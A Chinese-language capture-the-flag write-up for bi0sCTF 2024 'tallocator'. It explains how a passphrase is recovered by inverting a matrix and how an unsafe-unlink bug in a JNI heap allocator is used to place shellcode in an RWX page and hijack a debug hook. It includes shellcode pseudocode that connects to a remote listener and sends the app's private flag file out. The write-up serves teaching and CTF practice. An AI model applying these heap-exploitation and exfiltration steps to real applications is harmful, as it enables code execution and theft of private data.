# bi0sCTF 2024 - tallocator

## 题目简述

题目以 Android 应用为外壳，通过 JavaScript bridge 暴露一个 JNI 自定义分配器。调用分配/释放接口前需要 16 字符口令；口令检查把 16 个字符排成 $4\times4$ 矩阵，求逆后与内置浮点矩阵比较。通过检查后，自定义 allocator 的双向空闲链表缺少安全 unlink 校验，可被伪造 chunk 元数据利用，最终把分配位置导向固定 RWX 映射 `0x41410000`，写入 shellcode 并覆盖调试 hook。

## 解题过程

### 由目标逆矩阵恢复口令

JNI `check` 将口令字节依次填入矩阵 $A$，计算 $A^{-1}$，再与常量矩阵 $V$ 逐项比较，误差阈值为 $10^{-5}$。因此不必逆向搜索字符，利用

$$
\left(A^{-1}\right)^{-1}=A
$$

直接对 $V$ 求逆，再把接近整数的 16 个元素按行取整并转成 ASCII。结果为 `50133tbd5mrt1769`。由于源码使用单精度浮点，求逆后应将数值四舍五入到最近整数，并用原 JNI 算法重新计算一次确认误差。

### 理解不安全 unlink

分配器在首次调用时：

- 用 `sbrk(0x1000)` 建立私有堆；
- 在堆头保存 short/long bin 链表头；
- 固定映射一页 RWX 内存到 `0x41410000`；
- 每次 `talloc` 前从 `HeapStart + 0x28` 读取函数指针 `Debugger_talloc`，非零就调用。

空闲 chunk 的用户区前 16 字节被当作 `fd`、`bk`。从链表摘除时直接执行：

```c
if (FD(ptr) != 0) BK(FD(ptr)) = BK(ptr);
if (BK(ptr) != 0) FD(BK(ptr)) = FD(ptr);
```

没有检查 `fd->bk == ptr`、`bk->fd == ptr`，而接口还允许调用 `tree` 释放攻击者指定的地址。通过把伪 chunk 放在堆元数据附近并控制 `fd/bk`，一次后续分配的 unlink 就能把选定值写到链表头或调试 hook 附近。

### 将分配导向 RWX 页

官方 HTML exploit 的阶段如下：

1. 第一次分配返回用户指针，据此减去固定偏移得到 `HeapStart`；
2. 申请 short/long chunk，使用任意地址 `secure_tree` 和伪造的 size、fd、bk，让 allocator 把堆元数据本身当作空闲块；
3. 通过 unsafe unlink 改写 `HEAD_SHORT`，使下一次合适大小的分配返回 `0x41410000` 附近；
4. 在该 RWX 分配中写入原生 shellcode；
5. 再次伪造链表，把 `Debugger_talloc` 改成 shellcode 地址；
6. 发起任意一次 `secure_talloc`，在函数开头触发 hook。

利用脚本中 `0x41410008`、`0x41410018` 等值分别对应伪 chunk 用户指针和 hook 目标所需的元数据偏移。复现时应画出每个 chunk 的 `size/fd/bk/data` 布局，并在每次 unlink 后确认两个链表写目标，而不是只机械照搬调用序列。

### 在 SELinux 限制下取回 flag

目标环境不适合直接启动交互 shell。官方 shellcode 创建 TCP socket 并连接预设监听端口，然后打开应用私有目录中的 flag 文件，执行 `read` 后把内容写到 socket。其逻辑是：

```text
socket(AF_INET, SOCK_STREAM, 0)
connect(...)
open("/data/data/bi0sctf.android.challenge/flag", O_RDONLY)
read(fd, buffer, 0x50)
write(socket_fd, buffer, 0x50)
```

IP、端口与路径应按实际部署调整，不应保留官方 exploit 中的临时回连地址。

## 方法总结

Android 只是载体，决定性漏洞位于 JNI 原生分配器。口令部分用目标矩阵再求一次逆即可恢复；内存利用部分则是典型不安全 unlink：任意释放加可控 `fd/bk` 形成指针写，把 bin 链表引到固定 RWX 页，再覆盖每次分配都会调用的 hook。受 SELinux 限制时，直接 ORW 并回传文件比追求交互 shell 更可靠。
